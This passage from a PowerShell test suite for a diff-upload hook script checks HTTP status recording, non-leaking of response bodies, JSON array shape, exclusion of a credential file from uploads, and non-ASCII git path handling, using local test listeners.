# -SkipHttpErrorCheck, so pre-fix the 409 never throws and the status is read
# straight off the response - the same 409 this asserts. The defect was only
# ever observable on 5.1, where the parameter fails to bind. The pre-fix red
# evidence for this task is 30a-30d, which fail on any host. These two are
# regression cover for the replacement path: neuter Get-WebExceptionStatus to
# return '000' unconditionally and 30e goes red, which is the mutation that
# matters now that the parameter is gone.
Write-Host ""
Write-Host "=== Test Group 30e/30f: recovered status is real, transport failure is 000 (D277) ==="

# 30e: a 4xx carrying a JSON error body - the task's named edge case. The body
# is deliberately non-empty to exercise the one thing the helper must NOT do
# with it: this path's request body is a base64 diff, so a handler that echoed
# the response would put request content in the state file.
$g30eProj = New-SelfHealProject -Name 'd277-non2xx' -StrideMd @'
## after_doing
```bash
echo "ran"
```
'@
$g30ePort = 18894
$g30eJob = Start-Job -ArgumentList $g30ePort -ScriptBlock {
    param($Port)
    $l = [System.Net.HttpListener]::new()
    $l.Prefixes.Add("http://localhost:$Port/")
    try {
        $l.Start()
        # after_doing PUTs twice (early + refresh), exactly as 9d pins.
        for ($i = 0; $i -lt 2; $i++) {
            $ctx = $l.GetContext()
            $null = [System.IO.StreamReader]::new($ctx.Request.InputStream).ReadToEnd()
            $ctx.Response.StatusCode = 409
            $ctx.Response.ContentType = 'application/json'
            $b = [System.Text.Encoding]::UTF8.GetBytes('{"error":"conflict","detail":"SENTINEL_BODY_MUST_NOT_LEAK"}')
            $ctx.Response.OutputStream.Write($b, 0, $b.Length)
            $ctx.Response.OutputStream.Close()
        }
    } catch { } finally { if ($l.IsListening) { $l.Stop() } }
}
try {
    $null = Wait-ForListener -Port $g30ePort
    $g30eJson = @{ tool_input = @{ command = "curl -X PATCH http://localhost:$g30ePort/api/tasks/99/complete -H `"Authorization: Bearer tok`"" } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $g30eJson -Phase 'pre' -ProjectDir $g30eProj
    Wait-Job $g30eJob -Timeout 8 | Out-Null
    Remove-Job $g30eJob -Force -ErrorAction SilentlyContinue
    $g30eState = Get-Content -Raw -Path (Join-Path $g30eProj '.stride-diff-upload-state') -ErrorAction SilentlyContinue
    # ORDER IS THE GUARD. Assert-NotContains coerces a null haystack to '' and
    # passes vacuously, so an absent state file would satisfy every negative
    # below on its own. The positive assertion runs FIRST and fails on exactly
    # that case, which is what stops the negatives from being decoration.
    Assert-Contains "30e (D277): a 409 records its REAL status, not 000" "http_code=409" $g30eState
    Assert-NotContains "30e (D277): and is not misfiled as a transport failure" "http_code=000" $g30eState
    # The operator warning must carry the real code too - a warning that says
    # 000 for an HTTP error sends the reader looking for a network fault.
    Assert-Contains "30e (D277): the stderr warning names the real code" "HTTP 409" $r.Stderr
    Assert-NotContains "30e (D277): the response body never reaches the state file" "SENTINEL_BODY_MUST_NOT_LEAK" $g30eState
    Assert-NotContains "30e (D277): nor stderr" "SENTINEL_BODY_MUST_NOT_LEAK" $r.Stderr
    # STDOUT IS THE THIRD SINK, and the one a plausible future change would hit.
    # On pwsh 7 the response body is one property from the caught error, in
    # .ErrorDetails.Message, so a well-meaning `Write-Host "$_"` added to the
    # catch would put the base64 diff on the hook's stdout while both
    # assertions above stayed green. Stdout is also the hook's structured-JSON
    # channel, so anything landing there is read by the caller, not just logged.
    Assert-NotContains "30e (D277): nor stdout, the channel a leak would most likely reach" "SENTINEL_BODY_MUST_NOT_LEAK" $r.Stdout
} finally {
    if ($g30eJob -and $g30eJob.State -eq 'Running') { Stop-Job $g30eJob -ErrorAction SilentlyContinue }
    Remove-Job $g30eJob -Force -ErrorAction SilentlyContinue
}

# 30f: the other side of the discriminator. Port 1 is refused, so the exception
# carries a NULL .Response and there is no status to recover. 9c already
# observes 000 on this port as a side-effect of a different assertion; this
# states it as the contract, next to 30e, so the PAIR is what a future reader
# sees rather than two unrelated numbers in two groups.
$g30fProj = New-SelfHealProject -Name 'd277-refused' -StrideMd @'
## after_doing
```bash
echo "ran"
```
'@
$g30fJson = @{ tool_input = @{ command = 'curl -X PATCH http://127.0.0.1:1/api/tasks/99/complete -H "Authorization: Bearer tok"' } } | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $g30fJson -Phase 'pre' -ProjectDir $g30fProj
$g30fState = Get-Content -Raw -Path (Join-Path $g30fProj '.stride-diff-upload-state') -ErrorAction SilentlyContinue
# Positive first here too, for the reason 30e states.
Assert-Contains "30f (D277): a refused connection records 000" "http_code=000" $g30fState
Assert-NotContains "30f (D277): and invents no HTTP status" "http_code=4" $g30fState

# ------------------------------------------------------------
# 30g (D277): criterion 1's named edge cases - 0, 1 and many entries.
#
# The parameter this criterion is about, `ConvertTo-Json -AsArray`, was already
# gone before D277 was worked: W2100 replaced both sites with hand-wrapping.
# What W2100 did NOT leave behind is a test pinning the shape that parameter
# existed to guarantee, and the shape is the whole point - `ConvertTo-Json` on
# a ONE-element collection emits a bare object, not a one-element array, and
# the server reads this file as an array.
#
# The assertion has to be on the RAW TEXT. ConvertFrom-Json unwraps a
# single-element array to a scalar and Get-CaptureEntries re-wraps it with @(),
# so a parsed count of 1 is identical for `[{...}]` and `{...}` - the exact
# distinction under test would be erased by the parse. The first non-space
# character is the primitive that actually separates them.
Write-Host ""
Write-Host "=== Test Group 30g: snapshot is an ARRAY at 0, 1 and many entries (D277) ==="

foreach ($g30gCase in @(
    @{ Name = 'zero';  Files = @();                              Expect = 0 },
    @{ Name = 'one';   Files = @('a.txt');                       Expect = 1 },
    @{ Name = 'many';  Files = @('a.txt', 'b.txt', 'c.txt');     Expect = 3 }
)) {
    $g30gDir = New-CaptureRepo -Name "d277-shape-$($g30gCase.Name)"
    # BaseRef=HEAD explicitly: New-CaptureRepo has a single commit, so the
    # no-BaseRef HEAD~1 fallback (21i) has nothing to resolve and would empty
    # every case, making the 1-and-many rows pass as though they were the zero
    # row. The entries here are untracked working-tree files, which the capture
    # picks up against any base.
    Set-CaptureBase -Dir $g30gDir -TaskId '42' `
        -BaseRef (& git -C $g30gDir rev-parse HEAD | Out-String).Trim()
    foreach ($f in $g30gCase.Files) {
        Set-Content -Path (Join-Path $g30gDir $f) -Value "content of $f" -Encoding UTF8
    }
    $null = Invoke-CaptureRun -Dir $g30gDir -TaskId '42'
    $g30gRaw = Get-Content -Raw -Path (Join-Path $g30gDir '.stride-changed-files.json') -ErrorAction SilentlyContinue
    $g30gTrim = "$g30gRaw".Trim()

    # Non-vacuity: a missing or empty file would otherwise satisfy the negatives.
    Assert-Eq "30g/$($g30gCase.Name) (D277): a snapshot was written" "True" "$($g30gTrim.Length -gt 0)"
    # THE assertion. `[` for every count, including one.
    Assert-Eq "30g/$($g30gCase.Name) (D277): the snapshot opens as a JSON array, not a bare object" `
        "True" "$($g30gTrim.StartsWith('[') -and $g30gTrim.EndsWith(']'))"
    # Well-formed, and the count the capture actually saw.
    $g30gParsed = $null
    $g30gOk = $true
    try { $g30gParsed = @($g30gTrim | ConvertFrom-Json) } catch { $g30gOk = $false }
    Assert-Eq "30g/$($g30gCase.Name) (D277): and parses as valid JSON" "True" "$g30gOk"
    Assert-Eq "30g/$($g30gCase.Name) (D277): with $($g30gCase.Expect) entr$(if ($g30gCase.Expect -eq 1) { 'y' } else { 'ies' })" `
        "$($g30gCase.Expect)" "$($g30gParsed.Count)"
}

# ------------------------------------------------------------
# 30h/30i (D277): the UPLOAD-side filtered array, which is the site the task's
# "single-entry filtered array" edge case actually names.
#
# 30g pins the CAPTURE-side hand-wrap in Build-ChangedFilesSnapshot, read off
# .stride-changed-files.json. That is a different site from the one that
# matters here: Invoke-ChangedFilesUpload wraps $filteredJson SEPARATELY, after
# dropping .stride_auth.md and the hook's own artifacts, and it is that wrap the
# security_considerations point at. Two hand-wraps, and covering one says
# nothing about the other - reviewing D277 is what surfaced the gap.
#
# The existing upload-filter tests (7e, 7e2, 14b) all leave two or three
# survivors and assert with ConvertFrom-Json + -contains, which cannot see the
# difference between `[{...}]` and `{...}` at one element. So the ONE-survivor
# shape - the exact case ConvertTo-Json -AsArray existed to handle - was
# untested at this site.
#
# Assert on the DECODED TEXT's first and last character, for the reason 30g
# gives: a parsed count of 1 is identical either way.
Write-Host ""
Write-Host "=== Test Group 30h/30i: the upload-side FILTERED array at 1 and 0 survivors (D277) ==="

foreach ($g30hCase in @(
    @{ Name = 'one-survivor';  Port = 18896
       Snapshot = '[{"path":".stride-diff-upload-state","diff":"state"},{"path":"lib/only.ex","diff":"real patch"},{"path":".stride_auth.md","diff":"SECRET"}]'
       Expect = 1; Survivor = 'lib/only.ex' },
    @{ Name = 'zero-survivors'; Port = 18898
       Snapshot = '[{"path":".stride-diff-upload-state","diff":"state"},{"path":".stride_auth.md","diff":"SECRET"}]'
       Expect = 0; Survivor = '' }
)) {
    # Not a git repo, for the reason 7e2 states: the self-heal skips its build
    # when a snapshot is on disk, and the filter is name-based, so this case
    # exercises the filter and nothing else.
    $g30hProj = Join-Path $TmpDir "d277-filtered-$($g30hCase.Name)"
    New-Item -ItemType Directory -Path $g30hProj -Force | Out-Null
    Set-Content -Path (Join-Path $g30hProj '.stride.md') -Value @'
## before_review
```bash
echo "reviewing"
```
'@ -Encoding UTF8
    Set-Content -Path (Join-Path $g30hProj '.stride-env-cache') -Value "TASK_ID=42" -Encoding UTF8
    Set-Content -Path (Join-Path $g30hProj '.stride-changed-files.json') -Value $g30hCase.Snapshot -Encoding UTF8

    $g30hFix = Join-Path $TmpDir "d277-filtered-$($g30hCase.Name)-fixture.json"
    if (Test-Path $g30hFix) { Remove-Item -Force $g30hFix }
    $g30hJob = Start-Job -ArgumentList $g30hCase.Port, $g30hFix -ScriptBlock {
        param($Port, $Fixture)
        $l = [System.Net.HttpListener]::new()
        $l.Prefixes.Add("http://localhost:$Port/")
        try {
            $l.Start(); $ctx = $l.GetContext()
            $reader = [System.IO.StreamReader]::new($ctx.Request.InputStream)
            @{ Body = $reader.ReadToEnd() } | ConvertTo-Json -Compress | Set-Content -Path $Fixture -Encoding UTF8
            $ctx.Response.StatusCode = 200; $ctx.Response.OutputStream.Close()
        } catch { } finally { if ($l.IsListening) { $l.Stop() } }
    }
    try {
        $null = Wait-ForListener -Port $g30hCase.Port
        $g30hCmd = "curl -X PATCH http://localhost:$($g30hCase.Port)/api/tasks/42/complete -H `"Authorization: Bearer tok`""
        $g30hJson = @{ tool_input = @{ command = $g30hCmd } } | ConvertTo-Json -Compress
        $null = Invoke-HookScript -InputJson $g30hJson -Phase 'post' -ProjectDir $g30hProj
        Wait-Job $g30hJob -Timeout 8 | Out-Null
        Remove-Job $g30hJob -Force -ErrorAction SilentlyContinue

        # Non-vacuity first: no PUT means every assertion below is meaningless.
        Assert-Eq "30h/$($g30hCase.Name) (D277): the PUT reached the listener" "True" "$(Test-Path $g30hFix)"
        if (Test-Path $g30hFix) {
            $g30hRec  = Get-Content -Raw -Path $g30hFix | ConvertFrom-Json
            $g30hBody = $g30hRec.Body | ConvertFrom-Json
            $g30hTxt  = [System.Text.Encoding]::UTF8.GetString(
                [System.Convert]::FromBase64String($g30hBody.changed_files.data)).Trim()

            # THE assertion: the filtered wrap is an ARRAY at this survivor count.
            Assert-Eq "30h/$($g30hCase.Name) (D277): the FILTERED body is a JSON array, not a bare object" `
                "True" "$($g30hTxt.StartsWith('[') -and $g30hTxt.EndsWith(']'))"

            $g30hPaths = @(@($g30hTxt | ConvertFrom-Json) | ForEach-Object { $_.path })
            Assert-Eq "30h/$($g30hCase.Name) (D277): exactly $($g30hCase.Expect) entr$(if ($g30hCase.Expect -eq 1) { 'y' } else { 'ies' }) survived" `
                "$($g30hCase.Expect)" "$($g30hPaths.Count)"
            # The filter did its job - otherwise a pass-through would also be an
            # array and the shape assertion above would prove nothing.
            Assert-Eq "30h/$($g30hCase.Name) (D277): the credential file did not survive" `
                "False" "$($g30hPaths -contains '.stride_auth.md')"
            Assert-NotContains "30h/$($g30hCase.Name) (D277): and its content is nowhere in the uploaded body" "SECRET" $g30hTxt
            if ($g30hCase.Survivor) {
                Assert-Eq "30h/$($g30hCase.Name) (D277): the real change survived" `
                    "True" "$($g30hPaths -contains $g30hCase.Survivor)"
            }
        }
    } finally {
        if ($g30hJob -and $g30hJob.State -eq 'Running') { Stop-Job $g30hJob -ErrorAction SilentlyContinue }
        Remove-Job $g30hJob -Force -ErrorAction SilentlyContinue
    }
}

# ============================================================
# Test Group 31: D286 — non-ASCII paths through the dirty baseline
# ============================================================
# The ps1 suite had NO non-ASCII path fixture anywhere before this group. It is
# NOT true that it had no coverage of these functions — Group 14 drives both end
# to end through the hook script, 14a asserting the baseline was written and 14b
# driving the capture filter that reads it. An earlier version of this header
# claimed otherwise; the gap was always the non-ASCII fixture specifically, and
# overstating it obscures which check was actually missing. That absence is what
# let the defect sit: Build-ChangedFilesSnapshot was fixed to list with -z
# by W2100 and the bash twin by D278, while Write-DirtyBaseline kept listing
# without it — recording the octal-escaped display spelling against a snapshot
# keyed on the raw one, so the W1457 pre-existing-edit filter could never match
# a non-ASCII path and went silently inert for exactly those files, on Windows
# only. The failure direction is over-report, which is why nothing was loud.
#
# Same AST-extraction harness as Group 22, and the same non-vacuity rule: an
# incomplete extraction FAILS rather than letting every case below pass on
# functions that were never bound.
Write-Host ""
Write-Host "=== Test Group 31: D286 non-ASCII dirty baseline ==="

# Build-ChangedFilesSnapshot and its dependencies are extracted too, because
# AC3 asks for non-ASCII coverage of the SNAPSHOT as well as the baseline — and
# because asserting the W1457 filter's DECISION by hand-comparing two
# hash-object outputs proves the arithmetic, not the filter. The set mirrors the
# bash parity case 7ff's own want-list, which is the established list for
# driving this function out of process.
$g31Want = @('Write-DirtyBaseline', 'Read-DirtyBaseline', 'Split-NulList', 'Get-GitDiffBody',
             'Invoke-GitCapture', 'Get-NumstatBinarySet', 'Test-SafeRepoPath', 'Expand-OwnRanges',
             'Build-ChangedFilesSnapshot')
$g31Ast = [System.Management.Automation.Language.Parser]::ParseFile($HookScript, [ref]$null, [ref]$null)
$g31Fns = $g31Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
$g31Found = @()
foreach ($f in $g31Fns) {
    if ($g31Want -contains $f.Name) {
        $g31Found += $f.Name
        . ([scriptblock]::Create($f.Extent.Text))
    }
}
$g31Missing = @($g31Want | Where-Object { $g31Found -notcontains $_ })
if ($g31Missing.Count -gt 0) {
    Write-Host "  FAIL: 31-harness: could not extract from stride-hook.ps1: $($g31Missing -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 31-harness: all $($g31Want.Count) baseline functions extracted from the real hook" -ForegroundColor Green
    $script:PASS++

    $g31Git = Get-Command git -ErrorAction SilentlyContinue
    if (-not $g31Git) {
        Write-Host "  SKIP: 31: git unavailable" -ForegroundColor Yellow
    } else {
        # Two names that exercise the two distinct shapes D278 named on the bash
        # side: a non-ASCII FILENAME, and an ASCII file under a non-ASCII
        # DIRECTORY component. Both are quoted by git without -z.
        $g31File = [char]0x00E9 + 'clair.txt'                 # eclair.txt with e-acute
        $g31Dir  = [char]0x0441 + [char]0x043F + [char]0x0431 # Cyrillic directory
        foreach ($g31Case in @(
            @{ Name = 'quotePath-default'; QuotePath = $null },
            @{ Name = 'quotePath-false';   QuotePath = 'false' }
        )) {
            $g31Repo = Join-Path $TmpDir "d286_$($g31Case.Name)"
            New-Item -ItemType Directory -Force -Path $g31Repo | Out-Null
            Push-Location $g31Repo
            try {
                & git init -q 2>$null
                & git config user.email 'test@test.local' 2>$null
                & git config user.name 'Test' 2>$null
                if ($g31Case.QuotePath) { & git config core.quotePath $g31Case.QuotePath 2>$null }
                Set-Content -LiteralPath (Join-Path $g31Repo 'ascii.txt') -Value 'v1' -Encoding UTF8
                & git add -A 2>$null; & git commit -q -m v1 2>$null
                $g31Base = (& git rev-parse HEAD 2>$null | Out-String).Trim()

                # A tracked non-ASCII file, modified but not committed, plus an
                # ASCII file under a non-ASCII directory, untracked. Both are
                # "dirty at claim time".
                Set-Content -LiteralPath (Join-Path $g31Repo $g31File) -Value 'one' -Encoding UTF8
                & git add -A 2>$null; & git commit -q -m v2 2>$null
                $g31Base = (& git rev-parse HEAD 2>$null | Out-String).Trim()
                Set-Content -LiteralPath (Join-Path $g31Repo $g31File) -Value 'dirty-at-claim' -Encoding UTF8
                New-Item -ItemType Directory -Force -Path (Join-Path $g31Repo $g31Dir) | Out-Null
                Set-Content -LiteralPath (Join-Path $g31Repo (Join-Path $g31Dir 'inner.txt')) -Value 'untracked' -Encoding UTF8

                $ProjectDir = $g31Repo
                Write-DirtyBaseline -BaseRef $g31Base
                $g31Bl = Join-Path $g31Repo '.stride-dirty-baseline'
                $g31Txt = if (Test-Path -LiteralPath $g31Bl) { Get-Content -LiteralPath $g31Bl -Raw -Encoding UTF8 } else { '' }

                # THE DEFECT, stated as an assertion: the RAW spelling is on
                # file and the octal-escaped one is not. A backslash in a
                # baseline path is the quoted form's signature.
                Assert-Contains "31a/$($g31Case.Name) (D286): the baseline records the non-ASCII filename in its RAW spelling" `
                    $g31File $g31Txt
                Assert-NotContains "31a/$($g31Case.Name) (D286): and not the octal-escaped display spelling" `
                    '\3' $g31Txt
                Assert-Contains "31a/$($g31Case.Name) (D286): an ASCII file under a non-ASCII DIRECTORY is recorded raw too" `
                    $g31Dir $g31Txt

                # The hash is the half the quoted spelling also broke, and the
                # sentinel it produced is 'absent', NOT 'unhashable': the writer
                # Test-Paths the path before hashing, and the quoted spelling
                # names no file on disk, so the entry recorded the file as
                # non-existent. Measured on the pre-D286 tree, where the whole
                # line reads `absent "\303\251clair.txt"`. An earlier version of
                # this row asserted 'unhashable' and passed on BOTH trees —
                # a vacuous row, caught by running it against the pre-fix hook
                # rather than by reading it.
                Assert-NotContains "31a/$($g31Case.Name) (D286): the non-ASCII entry is not recorded as 'absent'" `
                    'absent' $g31Txt
                $g31Blob = ($g31Txt -split "`n" | Where-Object { $_ -like "*$g31File*" } | Select-Object -First 1) -replace ' .*$', ''
                Assert-Eq "31a/$($g31Case.Name) (D286): and carries a real 40-hex blob id, so the filter has something to compare" `
                    "True" "$($g31Blob -match '^[0-9a-f]{40}$')"

                # Round-trip: the reader must key on the same raw spelling.
                $g31Map = Read-DirtyBaseline
                Assert-Eq "31b/$($g31Case.Name) (D286): the reader keys the baseline on the same raw path the writer wrote" `
                    "True" "$($null -ne $g31Map -and $g31Map.ContainsKey($g31File))"

                # W1457's actual question, both answers. Unchanged since claim →
                # the path is in the baseline with a MATCHING hash (excluded).
                # Re-modified after claim → the hash differs (included).
                $g31HashAtClaim = $g31Map[$g31File]
                $g31HashNow = (& git hash-object -- $g31File 2>$null | Out-String).Trim()
                Assert-Eq "31c/$($g31Case.Name) (D286): a claim-dirty non-ASCII path unchanged since claim compares EQUAL (excluded)" `
                    $g31HashAtClaim $g31HashNow
                Set-Content -LiteralPath (Join-Path $g31Repo $g31File) -Value 'changed-again' -Encoding UTF8
                $g31HashAfter = (& git hash-object -- $g31File 2>$null | Out-String).Trim()
                Assert-Eq "31c/$($g31Case.Name) (D286): re-modified after claim compares DIFFERENT (included)" `
                    "True" "$($g31HashAtClaim -ne $g31HashAfter)"

                # 31d: the SNAPSHOT, which is what AC3's second half asks for and
                # what 31c above only approximates. 31c compares two hash-object
                # outputs by hand; that proves the arithmetic the filter uses,
                # not that the filter reaches the same answer. Here the real
                # Build-ChangedFilesSnapshot runs over the same fixture and the
                # assertion is made on what it actually emitted.
                $g31Snap = Build-ChangedFilesSnapshot -Base $g31Base -OwnRanges ''
                $g31Paths = @()
                if ($g31Snap) {
                    try { $g31Paths = @(($g31Snap | ConvertFrom-Json) | ForEach-Object { $_.path }) } catch { $g31Paths = @() }
                }
                Assert-Eq "31d/$($g31Case.Name) (D286): the snapshot is non-empty (a vacuous [] would pass every row below)" `
                    "True" "$($g31Paths.Count -gt 0)"
                # WHICH ROW DISCRIMINATES, AND IN WHICH VARIANT — measured, and
                # qualified, because this loop runs two. In the quotePath-DEFAULT
                # variant (the shipping Windows default) the EXCLUDED row is the
                # regression pin: pre-fix the baseline holds the quoted spelling,
                # nothing matches the raw path the capture produces, and the
                # untouched file is wrongly reported as changed. The INCLUDED row
                # is a control even there — an inert filter excludes nothing, so
                # a path that should be present is present for the wrong reason.
                # In the quotePath-FALSE variant git emits the raw spelling with
                # or without -z, so the defect cannot manifest and every row here
                # passes on both trees; that variant is a non-regression guard,
                # not a pin. An earlier version of this comment named the red row
                # without saying which variant it was red in.
                Assert-Eq "31d/$($g31Case.Name) (D286): a claim-dirty non-ASCII path re-modified after the claim IS in the snapshot" `
                    "True" "$($g31Paths -contains $g31File)"
                # The untracked file under a non-ASCII directory is unchanged
                # since the baseline was written, so the filter must drop it.
                $g31Inner = "$g31Dir/inner.txt"
                Assert-Eq "31d/$($g31Case.Name) (D286): a claim-dirty path under a non-ASCII directory, untouched since the claim, is EXCLUDED" `
                    "False" "$($g31Paths -contains $g31Inner)"

                # 31e: the two operations that produce a path git must spell,
                # and what each one actually exercises — MEASURED, because both
                # my first version of this case and the review comment that
                # prompted it assumed something git does not do.
                #
                # A RENAME DOES NOT LIST BOTH SIDES. `git diff --name-only`
                # collapses a detected rename to its DESTINATION only: against a
                # base where the file was `eclair.txt`, after `git mv` to
                # `ubung.txt`, --name-only emits the new path alone
                # (--name-status shows `R100 old new`, but --name-only does not).
                # So the rename case exercises the new path, and nothing else.
                #
                # THE VANISHED-SIDE BRANCH IS REACHED BY A DELETION, not by a
                # rename. `git rm` leaves the path listed against the base with
                # no file on disk, which is Write-DirtyBaseline's Test-Path-fails
                # branch and its 'absent' sentinel. That branch is the one worth
                # pinning with a non-ASCII path, so it gets its own operation
                # rather than being assumed as a side effect of the rename.
                #
                # Both rows compare whole records by their PATH column. A first
                # version built the rename target as 'renamed-' + the old name,
                # so the new spelling CONTAINED the old one and Assert-Contains —
                # a plain .Contains() over the whole file — passed the old-path
                # row on the strength of the new-path line.
                $g31Renamed = [char]0x00FC + 'bung.txt'
                & git mv -- $g31File $g31Renamed 2>$null
                if ($LASTEXITCODE -eq 0) {
                    Write-DirtyBaseline -BaseRef $g31Base
                    $g31RenLines = @(Get-Content -LiteralPath $g31Bl -Encoding UTF8)
                    $g31RenNew = @($g31RenLines | Where-Object { ($_ -replace '^\S+ ', '') -eq $g31Renamed })
                    Assert-Eq "31e/$($g31Case.Name) (D286): a rename records the destination non-ASCII path as its own raw record" `
                        "1" "$($g31RenNew.Count)"
                    Assert-Eq "31e/$($g31Case.Name) (D286): and it carries a real blob id, so the rename target is hashable" `
                        "True" "$($g31RenNew.Count -eq 1 -and $g31RenNew[0] -match '^[0-9a-f]{40} ')"
                    Assert-NotContains "31e/$($g31Case.Name) (D286): the rename destination is not octal-escaped" `
                        '\3' ($g31RenLines -join "`n")

                    # Now the deletion, on the path the rename just created.
                    # -f is required, not decorative: the rename is staged and
                    # uncommitted, so a plain `git rm` refuses with "has changes
                    # staged in the index". Without it this half SKIPPED, and a
                    # skip is a silent hole — the branch it exists to reach would
                    # simply never have been exercised.
                    & git rm -q -f -- $g31Renamed 2>$null
                    if ($LASTEXITCODE -eq 0) {
                        Write-DirtyBaseline -BaseRef $g31Base
                        $g31DelLines = @(Get-Content -LiteralPath $g31Bl -Encoding UTF8)
                        # The path the baseline now carries is the ORIGINAL one,
                        # not the rename target. Against the base, rename+delete
                        # nets out to "the committed file is gone": the base held
                        # $g31File, the working tree holds neither, so
                        # --name-only lists $g31File as deleted and $g31Renamed —
                        # never committed — does not appear at all. Asserting on
                        # the rename target here is what made these two rows fail
                        # when the skip was lifted; the suite caught it.
                        $g31DelOld = @($g31DelLines | Where-Object { ($_ -replace '^\S+ ', '') -eq $g31File })
                        Assert-Eq "31e/$($g31Case.Name) (D286): a deleted non-ASCII path is still recorded, as its own raw record" `
                            "1" "$($g31DelOld.Count)"
                        Assert-Eq "31e/$($g31Case.Name) (D286): and carries the 'absent' sentinel, so the Test-Path-fails branch was really reached with a raw path" `
                            "True" "$($g31DelOld.Count -eq 1 -and $g31DelOld[0] -like 'absent *')"
                    } else {
                        Write-Host "  SKIP: 31e/$($g31Case.Name): git rm failed on this host" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "  SKIP: 31e/$($g31Case.Name): git mv failed on this host" -ForegroundColor Yellow
                }
            } finally {
                Pop-Location
            }
        }
    }
}

# ============================================================
# Summary
# ============================================================
Write-Host ""
Write-Host "========================================"
$Total = $script:PASS + $script:FAIL
Write-Host "Results: $($script:PASS) passed, $($script:FAIL) failed (out of $Total)"

# (D241) Report this run's own wall clock and the load it measured, so a loaded
# run is distinguishable from a failing one WITHOUT re-running it.
$suiteWallS = [int](([long](Get-SuiteNowMs) - [long]$script:SuiteStartMs) / 1000)
# Sample the load AGAIN at the end — calibrating only at t=0 misses a run that
# begins quiet and turns busy, which is exactly the scenario that filed D241.
$suiteOverheadEndMs = Measure-SuiteOverheadMs
$suiteEndScale = [Math]::Max(1, [Math]::Ceiling($suiteOverheadEndMs / [double]$script:SuiteLoadBaselineMs))
Write-Host "Wall clock: ${suiteWallS}s (idle baseline ~$($script:SuiteWallBaselineS)s)  |  startup overhead: $($script:SuiteOverheadMs)ms at start, ${suiteOverheadEndMs}ms at end (idle baseline $($script:SuiteLoadBaselineMs)ms)"
if ($script:SuiteLoadScale -gt 1 -or $suiteEndScale -gt 1 -or $suiteWallS -gt ($script:SuiteWallBaselineS * 2)) {
    Write-Host ""
    Write-Host "WARNING: this machine was LOADED during the run ($($script:SuiteLoadScale)x at start,"
    Write-Host "         ${suiteEndScale}x at end, ${suiteWallS}s wall clock against a ~$($script:SuiteWallBaselineS)s idle"
    Write-Host "         baseline). Wall-clock backstops were scaled to the START sample, so a"
    Write-Host "         run that only became busy later got LESS headroom than it needed."
    Write-Host "         Reproduce any failure above on a quiet machine before diagnosing it as"
    Write-Host "         a code defect — that mistake is what filed D241."
}
Write-Host "========================================"

} finally {
    # Cleanup
    Remove-Item -Recurse -Force $TmpDir -ErrorAction SilentlyContinue
}

$script:StrideExitCode = if ($script:FAIL -gt 0) { 1 } else { 0 }

} finally {
    foreach ($kv in $script:StrideSavedEnv.GetEnumerator()) {
        Set-Item -Path "Env:$($kv.Key)" -Value $kv.Value -ErrorAction SilentlyContinue
    }
}

exit $script:StrideExitCode
